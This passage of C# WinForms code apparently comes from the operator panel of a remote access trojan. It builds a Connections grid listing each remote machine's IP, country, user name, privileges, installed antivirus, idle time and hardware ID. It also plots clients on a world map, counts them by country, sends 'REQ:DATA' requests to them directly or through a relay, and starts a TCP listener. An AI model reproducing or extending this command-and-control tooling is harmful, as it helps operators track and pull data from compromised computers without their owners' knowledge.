            gridView.Columns["Fingerprint"].Width = 220;
            gridView.Columns["ConnectionId"].Visible = false;

            // Keep the connection identity and health fields in the initial viewport.
            // Remaining columns stay available through the grid's horizontal scroll bar.
            // Keep the requested connection-information order. CPU is retained as a
            // useful hardware field and placed immediately after GPU.
            string[] priorityColumns = {
                "IP", "Country", "UserName", "Tag", "Nickname", "Version",
                "Privileges", "OS", "GPU", "CPU", "RAM", "AntiVirus",
                "Uptime", "AFKTime", "Ping", "HWID", "Fingerprint"
            };
            for (int index = 0; index < priorityColumns.Length; index++)
                gridView.Columns[priorityColumns[index]].VisibleIndex = index;

            gridView.RowStyle += (sender, args) =>
            {
                if (args.RowHandle >= 0 && gridView.IsRowSelected(args.RowHandle))
                {
                    // Do not use the DevExpress/default blue here.  This was the
                    // Use the exact requested dark selection surface for Connections rows.
                    args.Appearance.BackColor = ColorTranslator.FromHtml("#1A2028");
                    args.Appearance.ForeColor = Color.White;
                    args.HighPriority = true;
                }
            };

            gridView.CustomColumnDisplayText += (sender, args) =>
            {
                if ((args.Column.FieldName == "HWID" || args.Column.FieldName == "Fingerprint") && args.Value != null)
                {
                    string value = Convert.ToString(args.Value);
                    if (value.Length > 16)
                        args.DisplayText = value.Substring(0, 16) + "...";
                }
            };

            gridView.FocusedRowChanged += GridView_FocusedRowChanged;
            gridView.MouseDown += GridView_MouseDown;
            gridView.RowClick += GridView_RowClick;
            gridView.SelectionChanged += delegate { HandleGridSelectionChanged(); };

            SetupConnectionsSearchButton();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (!e.Control || e.KeyCode != Keys.F || xtraTabControl1 == null || xtraTabControl1.SelectedTabPage != xtraTabPage1)
                return;

            ShowConnectionsSearch();
            e.Handled = true;
            e.SuppressKeyPress = true;
        }

        private void ConfigureConnectionsLayout()
        {
            // The Connections tab previously used the grid as its only designed child,
            // then injected the search bar as a sibling at runtime. That mixed a large
            // anchored designer surface with runtime docking/z-order and made the two
            // regions compete for the same bounds. Give the tab one explicit content
            // host so the header and grid own disjoint layout regions.
            if (connectionsLayoutHost != null)
                return;

            xtraTabPage1.Controls.Remove(gridControl1);

            connectionsLayoutHost = new DevExpress.XtraEditors.PanelControl();
            connectionsLayoutHost.Name = "connectionsLayoutHost";
            connectionsLayoutHost.Dock = DockStyle.Fill;
            connectionsLayoutHost.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;

            connectionsSearchBar = new DevExpress.XtraEditors.PanelControl();
            connectionsSearchBar.Name = "connectionsSearchBar";
            connectionsSearchBar.Dock = DockStyle.Top;
            connectionsSearchBar.Height = 42;
            connectionsSearchBar.Padding = new Padding(4);
            connectionsSearchBar.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;

            gridControl1.Dock = DockStyle.Fill;
            gridControl1.Margin = Padding.Empty;
            gridControl1.Location = Point.Empty;

            connectionsLayoutHost.Controls.Add(gridControl1);
            connectionsLayoutHost.Controls.Add(connectionsSearchBar);
            xtraTabPage1.Controls.Add(connectionsLayoutHost);
            connectionsLayoutHost.BringToFront();
        }

        private int GetConnectionsExpandedSearchWidth()
        {
            if (connectionsSearchBar == null)
                return 0;

            // Keep the expanded surface responsive: approximately one quarter of the
            // currently available header width, with practical usability bounds.
            int quarter = (int)Math.Round(connectionsSearchBar.ClientSize.Width * 0.25D);
            return Math.Max(220, Math.Min(520, quarter));
        }

        private void UpdateConnectionsSearchLayout()
        {
            if (connectionsSearchBar == null || connectionsSearchEditorHost == null)
                return;

            connectionsSearchEditorHost.Width = GetConnectionsExpandedSearchWidth();
        }

        private void SetupConnectionsSearchButton()
        {
            if (connectionsSearchButton != null)
                return;

            connectionsSearchButton = new DevExpress.XtraEditors.SimpleButton();
            connectionsSearchButton.Name = "connectionsSearchButton";
            connectionsSearchButton.Dock = DockStyle.Right;
            connectionsSearchButton.Width = 42;
            connectionsSearchButton.Text = string.Empty;
            connectionsSearchButton.Cursor = Cursors.Hand;
            connectionsSearchButton.ToolTip = "Search connections (Ctrl+F)";
            connectionsSearchButton.ImageOptions.Image = CreateSearchIcon();
            connectionsSearchButton.Appearance.BackColor = SidebarBackgroundColor;
            connectionsSearchButton.Appearance.ForeColor = Color.White;
            connectionsSearchButton.Appearance.Options.UseBackColor = true;
            connectionsSearchButton.Appearance.Options.UseForeColor = true;
            connectionsSearchButton.AllowFocus = false;
            connectionsSearchButton.ShowFocusRectangle = DevExpress.Utils.DefaultBoolean.False;
            connectionsSearchButton.TabStop = false;
            connectionsSearchButton.MouseEnter += delegate {
                connectionsSearchButton.Appearance.BackColor = SidebarAccentColor;
                connectionsSearchButton.Appearance.ForeColor = Color.White;
            };
            connectionsSearchButton.MouseLeave += delegate {
                connectionsSearchButton.Appearance.BackColor = SidebarBackgroundColor;
                connectionsSearchButton.Appearance.ForeColor = Color.White;
            };
            connectionsSearchButton.Click += delegate { ShowConnectionsSearch(); };

            connectionsSearchEditorHost = new DevExpress.XtraEditors.PanelControl();
            connectionsSearchEditorHost.Name = "connectionsSearchEditorHost";
            connectionsSearchEditorHost.Dock = DockStyle.Right;
            connectionsSearchEditorHost.Height = connectionsSearchBar.ClientSize.Height - connectionsSearchBar.Padding.Vertical;
            connectionsSearchEditorHost.Padding = new Padding(0);
            connectionsSearchEditorHost.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;
            connectionsSearchEditorHost.Visible = false;

            connectionsSearchControl = new DevExpress.XtraEditors.SearchControl();
            connectionsSearchControl.Name = "connectionsSearchControl";
            connectionsSearchControl.Dock = DockStyle.Fill;
            connectionsSearchControl.Client = gridControl1;
            connectionsSearchControl.Properties.FindDelay = 150;
            connectionsSearchControl.Properties.NullValuePrompt = "Search connections...";
            connectionsSearchControl.ToolTip = "Search connections";
            connectionsSearchControl.KeyDown += ConnectionsSearchControl_KeyDown;

            connectionsSearchCloseButton = new DevExpress.XtraEditors.SimpleButton();
            connectionsSearchCloseButton.Name = "connectionsSearchCloseButton";
            connectionsSearchCloseButton.Dock = DockStyle.Right;
            connectionsSearchCloseButton.Width = 34;
            connectionsSearchCloseButton.Text = "×";
            connectionsSearchCloseButton.Cursor = Cursors.Hand;
            connectionsSearchCloseButton.ToolTip = "Close search (Esc)";
            connectionsSearchCloseButton.ForeColor = Color.White;
            connectionsSearchCloseButton.Appearance.BackColor = SidebarBackgroundColor;
            connectionsSearchCloseButton.Appearance.ForeColor = Color.White;
            connectionsSearchCloseButton.Appearance.Options.UseBackColor = true;
            connectionsSearchCloseButton.Appearance.Options.UseForeColor = true;
            connectionsSearchCloseButton.AllowFocus = false;
            connectionsSearchCloseButton.ShowFocusRectangle = DevExpress.Utils.DefaultBoolean.False;
            connectionsSearchCloseButton.TabStop = false;
            connectionsSearchCloseButton.MouseEnter += delegate {
                connectionsSearchCloseButton.Appearance.BackColor = SidebarAccentColor;
                connectionsSearchCloseButton.Appearance.ForeColor = Color.White;
                connectionsSearchCloseButton.ForeColor = Color.White;
            };
            connectionsSearchCloseButton.MouseLeave += delegate {
                connectionsSearchCloseButton.Appearance.BackColor = SidebarBackgroundColor;
                connectionsSearchCloseButton.Appearance.ForeColor = Color.White;
                connectionsSearchCloseButton.ForeColor = Color.White;
            };
            connectionsSearchCloseButton.Click += delegate { HideConnectionsSearch(); };

            connectionsSearchEditorHost.Controls.Add(connectionsSearchControl);
            connectionsSearchEditorHost.Controls.Add(connectionsSearchCloseButton);
            connectionsSearchBar.Controls.Add(connectionsSearchButton);
            connectionsSearchBar.Controls.Add(connectionsSearchEditorHost);
            connectionsSearchBar.Resize += delegate { UpdateConnectionsSearchLayout(); };

            UpdateConnectionsSearchLayout();
        }

        private void ShowConnectionsSearch()
        {
            if (connectionsSearchControl == null || connectionsSearchButton == null || connectionsSearchCloseButton == null)
                return;

            connectionsSearchButton.Visible = false;
            connectionsSearchEditorHost.Visible = true;
            UpdateConnectionsSearchLayout();
            connectionsSearchEditorHost.BringToFront();
            connectionsSearchControl.Focus();
            connectionsSearchControl.SelectAll();
        }

        private void HideConnectionsSearch()
        {
            if (connectionsSearchControl == null || connectionsSearchButton == null || connectionsSearchCloseButton == null)
                return;

            connectionsSearchControl.Visible = true;
            connectionsSearchEditorHost.Visible = false;
            connectionsSearchButton.Visible = true;
            connectionsSearchButton.BringToFront();
            if (xtraTabControl1 != null) xtraTabControl1.Focus();
        }

        private void ConnectionsSearchControl_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Escape)
                return;

            if (!string.IsNullOrEmpty(connectionsSearchControl.Text))
            {
                connectionsSearchControl.Text = string.Empty;
                e.Handled = true;
                e.SuppressKeyPress = true;
                return;
            }

            HideConnectionsSearch();
            e.Handled = true;
            e.SuppressKeyPress = true;
        }

        private Bitmap CreateSearchIcon()
        {
            Bitmap bitmap = new Bitmap(18, 18);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            using (Pen pen = new Pen(Color.White, 2.0f))
            {
                graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
                graphics.Clear(Color.Transparent);
                graphics.DrawEllipse(pen, 2, 2, 9, 9);
                graphics.DrawLine(pen, 10, 10, 15, 15);
            }
            return bitmap;
        }

        private void GridView_MouseDown(object sender, MouseEventArgs e)
        {
            connectionMouseDownSelectionId = string.Empty;
            connectionMouseDownWasSelected = false;

            if (e.Button != MouseButtons.Left || gridView == null)
                return;

            GridHitInfo hitInfo = gridView.CalcHitInfo(e.Location);

            if (hitInfo.InDataRow && hitInfo.RowHandle >= 0)
            {
                connectionMouseDownSelectionId = Convert.ToString(
                    gridView.GetRowCellValue(hitInfo.RowHandle, "ConnectionId"));
                connectionMouseDownWasSelected = gridView.IsRowSelected(hitInfo.RowHandle);
                return;
            }

            // Only clicks in the actual empty-row area clear selection. Do not
            // treat headers, the group panel, scrollbars, the filter panel, or
            // other grid UI as an empty-space click.
            if (hitInfo.HitTest == GridHitTest.EmptyRow)
            {
                gridView.ClearSelection();
                HighlightClientOnMap(string.Empty);
            }
        }

        private void GridView_RowClick(object sender, DevExpress.XtraGrid.Views.Grid.RowClickEventArgs e)
        {
            if (e.RowHandle < 0 || e.Button != MouseButtons.Left)
                return;

            // RowClick may run before or after DevExpress applies its native row
            // selection. The pre-click state is therefore captured on MouseDown;
            // never infer it from IsRowSelected here. If the clicked row was
            // already selected, wait until native processing completes and then
            // toggle that same ConnectionId off. Resolving the current selected
            // row by ConnectionId avoids stale row-handle races during filtering
            // or other view updates.
            if (!connectionMouseDownWasSelected || string.IsNullOrWhiteSpace(connectionMouseDownSelectionId))
                return;

            string connectionId = connectionMouseDownSelectionId;
            BeginInvoke(new Action(() => UnselectConnectionById(connectionId)));
        }

        private void UnselectConnectionById(string connectionId)
        {
            if (IsDisposed || !IsHandleCreated || gridView == null || string.IsNullOrWhiteSpace(connectionId))
                return;

            int[] selectedRows = gridView.GetSelectedRows();
            if (selectedRows == null)
                return;

            foreach (int rowHandle in selectedRows)
            {
                if (rowHandle < 0)
                    continue;

                string selectedId = Convert.ToString(
                    gridView.GetRowCellValue(rowHandle, "ConnectionId"));
                if (string.Equals(selectedId, connectionId, StringComparison.Ordinal))
                {
                    gridView.UnselectRow(rowHandle);
                    break;
                }
            }

            int[] remainingSelectedRows = gridView.GetSelectedRows();
            if (remainingSelectedRows == null || remainingSelectedRows.Length == 0)
                HighlightClientOnMap(string.Empty);
        }

        private void HandleGridSelectionChanged()
        {
            if (gridView == null)
                return;

            int[] selectedRows = gridView.GetSelectedRows();
            HashSet<string> currentSelection = new HashSet<string>(StringComparer.Ordinal);

            if (selectedRows == null)
            {
                selectedConnectionIds.Clear();
                HighlightClientOnMap(string.Empty);
                return;
            }

            foreach (int rowHandle in selectedRows)
            {
                if (rowHandle < 0)
                    continue;

                string connectionId = Convert.ToString(gridView.GetRowCellValue(rowHandle, "ConnectionId"));
                if (!string.IsNullOrWhiteSpace(connectionId))
                    currentSelection.Add(connectionId);
            }

            foreach (string connectionId in currentSelection)
            {
                if (!selectedConnectionIds.Contains(connectionId))
                    RequestTelemetryRefresh(connectionId);
            }

            selectedConnectionIds.Clear();
            foreach (string connectionId in currentSelection)
                selectedConnectionIds.Add(connectionId);
        }

        private void RequestTelemetryRefresh(string connectionId)
        {
            if (IsRelayConnectionId(connectionId))
            {
                string target = GetConnectionFingerprint(connectionId);
                if (string.IsNullOrWhiteSpace(target) || relayGatewayClient == null || !relayGatewayClient.IsConnected)
                    return;
                lock (connectionStateLock)
                {
                    pendingTelemetryRefreshes.Add(connectionId);
                    telemetryRequestTicks[connectionId] = Stopwatch.GetTimestamp();
                }
                Task.Run(async delegate
                {
                    try
                    {
                        RelayCommandResult result = await relayGatewayClient.SendCommandAsync(target, "REQ:DATA", CancellationToken.None).ConfigureAwait(false);
                        if (!result.Accepted) LogFinalCommandResult("REQ:DATA", "failed: " + result.Detail, LogType.Error);
                    }
                    catch (Exception ex) { LogFinalCommandResult("REQ:DATA", "failed: " + ex.Message, LogType.Error); }
                });
                return;
            }

            TcpClient client = null;

            lock (connectionStateLock)
            {
                if (connectedClients.TryGetValue(connectionId, out TcpClient candidate))
                    client = candidate;
            }

            if (client == null)
                return;

            try
            {
                lock (connectionStateLock)
                {
                    pendingTelemetryRefreshes.Add(connectionId);
                    telemetryRequestTicks[connectionId] = Stopwatch.GetTimestamp();
                }

                NetworkStream stream = client.GetStream();
                byte[] request = Encoding.UTF8.GetBytes("REQ:DATA\n");
                stream.Write(request, 0, request.Length);
                stream.Flush();
            }
            catch (IOException)
            {
                // Let the reader loop determine the actual connection state.
            }
            catch (ObjectDisposedException)
            {
                // Let the reader loop determine the actual connection state.
            }
            catch (SocketException)
            {
                // Let the reader loop determine the actual connection state.
            }
        }

        private void GridView_FocusedRowChanged(object sender, DevExpress.XtraGrid.Views.Base.FocusedRowChangedEventArgs e)
        {
            if (e.FocusedRowHandle >= 0)
            {
                // Highlight the selected client on the map
                string ip = gridView.GetRowCellValue(e.FocusedRowHandle, "IP").ToString();
                HighlightClientOnMap(ip);
            }
        }

        private void HighlightClientOnMap(string ip)
        {
            if (clientsLayer?.Data is MapItemStorage storage)
            {
                foreach (MapItem item in storage.Items)
                {
                    if (item.Tag != null && item.Tag.ToString() == ip)
                    {
                        // Highlight this item
                        if (item is MapBubble bubble)
                        {
                            
                        }
                    }
                    else
                    {
                        // Reset other items
                        if (item is MapBubble bubble)
                        {
                            bubble.StrokeWidth = 1;
                            bubble.Stroke = Color.White;
                        }
                    }
                }
            }
        }
        private void UpdateCountryStats()
        {
            // This should run on the UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateCountryStats));
                return;
            }

            try
            {
                // Create a dictionary to count countries
                Dictionary<string, int> countryCounts = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);

                // Initialize with zero for all countries we're tracking
                countryCounts["USA"] = 0;
                countryCounts["Italy"] = 0;
                countryCounts["Canada"] = 0;
                countryCounts["Germany"] = 0;
                countryCounts["Romania"] = 0;
                countryCounts["Sweden"] = 0;
                countryCounts["Denmark"] = 0;
                countryCounts["France"] = 0;
                countryCounts["China"] = 0;
                countryCounts["Ukraine"] = 0;
                countryCounts["Japan"] = 0;
                countryCounts["Vietnam"] = 0;
                countryCounts["Turkey"] = 0;
                countryCounts["India"] = 0;
                countryCounts["Brasil"] = 0;
                countryCounts["Brazil"] = 0; // Alternative spelling
                countryCounts["Spain"] = 0;
                countryCounts["Portugal"] = 0;
                countryCounts["Argentina"] = 0;
                countryCounts["Mexico"] = 0;
                countryCounts["Nigeria"] = 0;
                countryCounts["Other"] = 0;

                // Count clients by country using the DataTable for better performance
                if (clientsTable != null && clientsTable.Rows.Count > 0)
                {
                    // Get country column index
                    int countryColumnIndex = clientsTable.Columns.IndexOf("Country");

                    if (countryColumnIndex >= 0)
                    {
                        // Count country values directly from the DataTable to avoid
                        // DataSetExtensions APIs that expose XML-linked framework types.
                        foreach (DataRow row in clientsTable.Rows)
                        {
                            string country = Convert.ToString(row[countryColumnIndex], System.Globalization.CultureInfo.InvariantCulture) ?? string.Empty;
                            country = country.Trim();

                            if (string.IsNullOrWhiteSpace(country))
                            {
                                country = "Other";
                            }

                            if (countryCounts.ContainsKey(country))
                            {
                                countryCounts[country]++;
                            }
                            else
                            {
                                countryCounts["Other"]++;
                            }
                        }
                    }
                }

                // Update the label controls with counts
                uscount.Text = countryCounts["USA"].ToString();
                italycount.Text = countryCounts["Italy"].ToString();
                canadacount.Text = countryCounts["Canada"].ToString();
                germanycount.Text = countryCounts["Germany"].ToString();
                romaniacount.Text = countryCounts["Romania"].ToString();
                swedencount.Text = countryCounts["Sweden"].ToString();
                label158.Text = countryCounts["Denmark"].ToString(); // Denmark
                label24.Text = countryCounts["France"].ToString(); // France
                label10.Text = countryCounts["China"].ToString(); // China
                ukrainecount.Text = countryCounts["Ukraine"].ToString();
                label149.Text = countryCounts["Japan"].ToString(); // Japan
                label152.Text = countryCounts["Vietnam"].ToString(); // Vietnam
                label155.Text = countryCounts["Turkey"].ToString(); // Turkey
                label146.Text = countryCounts["India"].ToString(); // India

                // For Brazil, combine both spellings
                label131.Text = (countryCounts["Brasil"] + countryCounts["Brazil"]).ToString(); // Brasil

                label134.Text = countryCounts["Spain"].ToString(); // Spain
                label137.Text = countryCounts["Portugal"].ToString(); // Portugal
                label140.Text = countryCounts["Argentina"].ToString(); // Argentina
                label143.Text = countryCounts["Mexico"].ToString(); // Mexico
                label161.Text = countryCounts["Nigeria"].ToString(); // Nigeria
                label164.Text = countryCounts["Other"].ToString(); // Other
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating country stats: {ex.Message}");
            }
        }
        private void SetupMapControl()
        {
            mapControl1.Layers.Clear();
            mapControl1.BackColor = Color.FromArgb(26, 26, 26);

            // Preserve the existing OpenStreetMap base layer, but keep network/provider
            // failure from preventing the local administrative boundaries from loading.
            try
            {
                ImageLayer baseLayer = new ImageLayer();
                OpenStreetMapDataProvider osmProvider = new OpenStreetMapDataProvider();
                baseLayer.DataProvider = osmProvider;
                mapControl1.Layers.Insert(0, baseLayer);
            }
            catch (Exception ex)
            {
                Console.WriteLine("OpenStreetMap base layer unavailable: " + ex.Message);
            }

            // Create layer for client markers.
            clientsLayer = new VectorItemsLayer();
            mapControl1.Layers.Add(clientsLayer);

            MapItemStorage storage = new MapItemStorage();
            clientsLayer.Data = storage;

            mapControl1.ZoomLevel = 2;
            mapControl1.CenterPoint = new GeoPoint(20, 0);
            mapControl1.EnableScrolling = true;
            mapControl1.EnableZooming = true;
            mapControl1.Refresh();
        }

        // Method to add a client to the grid and map
        private void AddClient(string ip, string country, string os, string gpu, string cpu,
                      bool exists1 = false, bool exists2 = false, bool exists3 = false)
        {
            // Must run on UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(() => AddClient(ip, country, os, gpu, cpu, exists1, exists2, exists3)));
                return;
            }

            try
            {
                // Add to grid
                DataRow row = clientsTable.NewRow();
                row["IP"] = ip;
                row["Country"] = country;
                row["OS"] = os;
                row["GPU"] = gpu;
                row["CPU"] = cpu;
                row["Exists1"] = exists1;
                row["Exists2"] = exists2;
                row["Exists3"] = exists3;

                clientsTable.Rows.Add(row);

                // Add to map
                AddClientToMap(ip, country, exists1, exists2, exists3);

                // Update country stats
                UpdateCountryStats();

                // Update total client count on label2
                label2.Text = clientsTable.Rows.Count.ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding client: {ex.Message}");
            }
        }
        private void SetupCountryStatsTimer()
        {
            System.Windows.Forms.Timer statsTimer = new System.Windows.Forms.Timer();
            statsTimer.Interval = 10000; // Refresh every 10 seconds 
            statsTimer.Tick += (s, e) => UpdateCountryStats();
            statsTimer.Start();
        }

        private void AddClientToMap(string ip, string country, bool exists1, bool exists2, bool exists3)
        {
            try
            {
                // Get location for client (using both IP and country now)
                GeoPoint location = GetLocationForClient(ip, country);

                if (location != null && clientsLayer?.Data is MapItemStorage storage)
                {
                    // Create bubble for client
                    MapBubble bubble = new MapBubble();
                    bubble.Location = location;
                    bubble.Tag = ip;

                    // Size based on features
                    int existsCount = (exists1 ? 1 : 0) + (exists2 ? 1 : 0) + (exists3 ? 1 : 0);
                    bubble.Size = 5 + (existsCount * 5);

                    // Color based on country
                    bubble.Fill = GetColorForCountry(country);
                    bubble.Stroke = Color.White;
                    bubble.StrokeWidth = 1;

                    // Add to map
                    storage.Items.Add(bubble);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding client to map: {ex.Message}");
            }
        }

        private GeoPoint GetLocationForClient(string ip, string country)
        {
            // Generate a unique key for this client
            string clientKey = $"{country}_{ip}";

            // Check if we already have a location for this specific client
            if (locationCache.ContainsKey(clientKey))
                return locationCache[clientKey];

            // Get base location for the country
            GeoPoint baseLocation = GetBaseLocationForCountry(country);

            // Create a random offset based on IP address to spread out clients
            // We'll use the IP as a seed for the random number generator
            int ipSeed = ip.GetHashCode();
            Random random = new Random(ipSeed);

            // Generate offset (roughly within a 100-200 mile radius)
            // 0.5-1.5 degrees is approximately 30-100 miles depending on latitude
            double latOffset = (random.NextDouble() * 2 - 1) * 0.5; // -0.5 to 0.5 degrees
            double lonOffset = (random.NextDouble() * 2 - 1) * 0.5; // -0.5 to 0.5 degrees

            // Apply the offset to create a unique but close location
            GeoPoint clientLocation = new GeoPoint(
                baseLocation.Latitude + latOffset,
                baseLocation.Longitude + lonOffset
            );

            // Cache this client's specific location
            locationCache[clientKey] = clientLocation;
            return clientLocation;
        }

        // Method to get the base country location
        private GeoPoint GetBaseLocationForCountry(string country)
        {
            // If we have a base country location cached, return it
            string countryKey = "base_" + country;
            if (locationCache.ContainsKey(countryKey))
                return locationCache[countryKey];

            // Standard country locations
            GeoPoint location;

            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    location = new GeoPoint(37.7749, -122.4194); // San Francisco
                    break;
                case "china":
                    location = new GeoPoint(39.9042, 116.4074); // Beijing
                    break;
                case "russia":
                    location = new GeoPoint(55.7558, 37.6173); // Moscow
                    break;
                case "germany":
                    location = new GeoPoint(52.5200, 13.4050); // Berlin
                    break;
                case "uk":
                case "united kingdom":
                    location = new GeoPoint(51.5074, -0.1278); // London
                    break;
                case "france":
                    location = new GeoPoint(48.8566, 2.3522); // Paris
                    break;
                case "japan":
                    location = new GeoPoint(35.6762, 139.6503); // Tokyo
                    break;
                case "brazil":
                case "brasil":
                    location = new GeoPoint(-22.9068, -43.1729); // Rio
                    break;
                case "india":
                    location = new GeoPoint(28.6139, 77.2090); // New Delhi
                    break;
                case "canada":
                    location = new GeoPoint(43.6532, -79.3832); // Toronto
                    break;
                // Added these countries
                case "italy":
                    location = new GeoPoint(41.9028, 12.4964); // Rome
                    break;
                case "spain":
                    location = new GeoPoint(40.4168, -3.7038); // Madrid
                    break;
                case "portugal":
                    location = new GeoPoint(38.7223, -9.1393); // Lisbon
                    break;
                case "sweden":
                    location = new GeoPoint(59.3293, 18.0686); // Stockholm
                    break;
                case "denmark":
                    location = new GeoPoint(55.6761, 12.5683); // Copenhagen
                    break;
                case "norway":
                    location = new GeoPoint(59.9139, 10.7522); // Oslo
                    break;
                case "finland":
                    location = new GeoPoint(60.1699, 24.9384); // Helsinki
                    break;
                case "poland":
                    location = new GeoPoint(52.2297, 21.0122); // Warsaw
                    break;
                case "ukraine":
                    location = new GeoPoint(50.4501, 30.5234); // Kyiv
                    break;
                case "romania":
                    location = new GeoPoint(44.4268, 26.1025); // Bucharest
                    break;
                case "turkey":
                    location = new GeoPoint(41.0082, 28.9784); // Istanbul
                    break;
                case "australia":
                    location = new GeoPoint(-33.8688, 151.2093); // Sydney
                    break;
                case "argentina":
                    location = new GeoPoint(-34.6037, -58.3816); // Buenos Aires
                    break;
                case "mexico":
                    location = new GeoPoint(19.4326, -99.1332); // Mexico City
                    break;
                case "vietnam":
                    location = new GeoPoint(21.0278, 105.8342); // Hanoi
                    break;
                default:
                    // For unknown countries, instead of completely random placement,
                    // let's try to place them in a reasonable continent-based area

                    // Create a deterministic but consistent seed
                    Random random = new Random(country.GetHashCode());

                    // Determine if the country might be in Europe (a common case for many countries)
                    bool mightBeEuropean = false;
                    foreach (string ending in new[] { "ia", "land", "stan", "any", "ark", "ary", "way" })
                    {
                        if (country.ToLower().EndsWith(ending))
                        {
                            mightBeEuropean = true;
                            break;
                        }
                    }

                    double lat, lon;

                    if (mightBeEuropean)
                    {
                        // European bounds - rough approximation
                        lat = 40.0 + (random.NextDouble() * 20); // 40 to 60 degrees north
                        lon = -5.0 + (random.NextDouble() * 40); // -5 to 35 degrees east
                    }
                    else
                    {
                        // Worldwide, but avoid extreme polar regions
                        lat = (random.NextDouble() * 140) - 70; // -70 to 70
                        lon = (random.NextDouble() * 360) - 180; // -180 to 180
                    }

                    location = new GeoPoint(lat, lon);
                    break;
            }

            // Cache the base location
            locationCache[countryKey] = location;
            return location;
        }
        private GeoPoint GetLocationForCountry(string country)
        {
            // Cache lookup
            if (locationCache.ContainsKey(country))
                return locationCache[country];

            // Standard country locations
            GeoPoint location;

            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    location = new GeoPoint(37.7749, -122.4194); // San Francisco
                    break;
                case "china":
                    location = new GeoPoint(39.9042, 116.4074); // Beijing
                    break;
                case "russia":
                    location = new GeoPoint(55.7558, 37.6173); // Moscow
                    break;
                case "germany":
                    location = new GeoPoint(52.5200, 13.4050); // Berlin
                    break;
                case "uk":
                case "united kingdom":
                    location = new GeoPoint(51.5074, -0.1278); // London
                    break;
                case "france":
                    location = new GeoPoint(48.8566, 2.3522); // Paris
                    break;
                case "japan":
                    location = new GeoPoint(35.6762, 139.6503); // Tokyo
                    break;
                case "brazil":
                    location = new GeoPoint(-22.9068, -43.1729); // Rio
                    break;
                case "india":
                    location = new GeoPoint(28.6139, 77.2090); // New Delhi
                    break;
                case "canada":
                    location = new GeoPoint(43.6532, -79.3832); // Toronto
                    break;
                default:
                    // Random but consistent location for unknown countries
                    Random random = new Random(country.GetHashCode());
                    double lat = (random.NextDouble() * 170) - 85; // -85 to 85
                    double lon = (random.NextDouble() * 360) - 180; // -180 to 180
                    location = new GeoPoint(lat, lon);
                    break;
            }

            // Cache the result
            locationCache[country] = location;
            return location;
        }

        private Color GetColorForCountry(string country)
        {
            // Grayscale colors by country
            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    return Color.FromArgb(240, 240, 240); // Almost white
                case "china":
                    return Color.FromArgb(210, 210, 210);
                case "russia":
                    return Color.FromArgb(190, 190, 190);
                case "germany":
                    return Color.FromArgb(170, 170, 170);
                case "uk":
                case "united kingdom":
                    return Color.FromArgb(150, 150, 150);
                case "france":
                    return Color.FromArgb(130, 130, 130);
                case "japan":
                    return Color.FromArgb(110, 110, 110);
                case "brazil":
                    return Color.FromArgb(90, 90, 90);
                case "india":
                    return Color.FromArgb(70, 70, 70);
                case "canada":
                    return Color.FromArgb(50, 50, 50); // Almost black
                default:
                    return Color.FromArgb(180, 180, 180); // Medium gray
            }
        }
        private System.Windows.Forms.Timer resourceMonitorTimer;
        private PerformanceCounter cpuCounter;
        private PerformanceCounter ramCounter;
        private PerformanceCounter diskCounter;
        private void SetupResourceMonitor()
        {
            try
            {
                // Initialize performance counters
                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                ramCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
                diskCounter = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");

                // First read (first read is usually 0)
                cpuCounter.NextValue();
                ramCounter.NextValue();
                diskCounter.NextValue();

                // Small delay for more accurate first reading
                Thread.Sleep(1000);

                // Set up timer for periodic updates
                resourceMonitorTimer = new System.Windows.Forms.Timer();
                resourceMonitorTimer.Interval = 2000; // Update every 2 seconds
                resourceMonitorTimer.Tick += ResourceMonitorTimer_Tick;
                resourceMonitorTimer.Start();

                // Get initial values
                UpdateResourceLabels();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error setting up resource monitor: {ex.Message}");
                // Set default values if counters fail
                label39.Text = "CPU: ---%";
                label40.Text = "RAM: ---%";
                label42.Text = "Disk: ---%";
            }
        }

        private void ResourceMonitorTimer_Tick(object sender, EventArgs e)
        {
            UpdateResourceLabels();
        }

        private void UpdateResourceLabels()
        {
            try
            {
                // Get current values
                float cpuUsage = cpuCounter.NextValue();
                float ramUsage = ramCounter.NextValue();
                float diskUsage = diskCounter.NextValue();

                // Update labels
                // CPU usage
                label39.Text = $"{cpuUsage:0}%";

                // RAM usage
                label40.Text = $"{ramUsage:0}%";

                // Disk usage
                label42.Text = $"{diskUsage:0}%";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating resource labels: {ex.Message}");
            }
        }

        // Clean up resources when form closes
        private void CleanupResourceMonitor()
        {
            if (resourceMonitorTimer != null)
            {
                resourceMonitorTimer.Stop();
                resourceMonitorTimer.Dispose();
            }

            if (cpuCounter != null)
                cpuCounter.Dispose();

            if (ramCounter != null)
                ramCounter.Dispose();

            if (diskCounter != null)
                diskCounter.Dispose();
        }
        #region TCP Server Implementation

        private void StartServer(int port)
        {
            try
            {
                if (isServerRunning)
                {
                    LogServerEvent("Start request ignored: listener already running", LogType.Warning);
                    return;
                }

                var listener = new TcpListener(System.Net.IPAddress.Any, port);
                listener.Start();

                tcpServer = listener;
                serverStopRequested = false;
                isServerRunning = true;

                AppendServerSettingsLog("Server listening on port " + port, LogType.Success);
                AppendServerSettingsLog("Listening for connections", LogType.Info);

                serverThread = new Thread(() => RunServer(port))
                {
                    IsBackground = true
                };
                serverThread.Start();
            }
            catch (SocketException ex)
            {
                isServerRunning = false;
                tcpServer = null;
                LogServerEvent("Port listen failed: " + ex.Message, LogType.Error);
